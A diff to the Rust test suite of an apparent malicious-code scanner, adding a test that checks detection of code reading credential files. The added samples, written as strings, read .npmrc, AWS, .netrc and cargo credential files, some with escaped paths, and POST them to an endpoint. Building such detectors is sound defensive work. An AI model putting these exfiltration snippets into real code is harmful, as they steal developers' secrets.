@@ -303,7 +303,8 @@ fn rust_batched_struct_shorthand_payload() {
 }
 #[test]
 fn helper_parameter_substitution_is_simultaneous() {
-    use super::{PARAM_START, substitute};
+    use super::PARAM_START;
+    use super::eval::substitute;
     assert_eq!(
         substitute(1 << PARAM_START, &[1 << (PARAM_START + 2)]),
         1 << (PARAM_START + 2)
@@ -503,4 +504,43 @@ fn constant_boolean_branches_preserve_only_the_reachable_payload() {
             "{source}"
         );
     }
+}
+
+#[test]
+fn credential_paths_match_on_the_decoded_literal() {
+    for (file, source) in [
+        (
+            "lib.py",
+            "import requests\ndef run():\n requests.post(endpoint,data=open('/home/u/\\x2enpmrc').read())\n",
+        ),
+        (
+            "lib.py",
+            "import requests\ndef run():\n requests.post(endpoint,data=open(r'C:\\Users\\u\\.aws\\credentials').read())\n",
+        ),
+        (
+            "lib.py",
+            "import requests\ndef run():\n requests.post(endpoint,data=open(\"\"\"/root/.netrc\"\"\").read())\n",
+        ),
+        (
+            "lib.rs",
+            "fn run(){ureq::post(endpoint).send(std::fs::read(\"C:\\\\Users\\\\u\\\\.aws\\\\credentials\"));}",
+        ),
+        (
+            "x.js",
+            "fetch(endpoint, {body: fs.readFileSync('/home/u/\\u002enpmrc')})",
+        ),
+    ] {
+        let found = kinds(file, source);
+        assert!(
+            found.contains("credential-file-http-body"),
+            "{source}: {found:?}"
+        );
+    }
+    assert!(
+        kinds(
+            "lib.rs",
+            "fn run(){ureq::post(endpoint).send(std::fs::read(\"C:\\\\Users\\\\u\\\\.cargo\\\\credentials\"));}"
+        )
+        .contains("cargo-credential-http-body")
+    );
 }
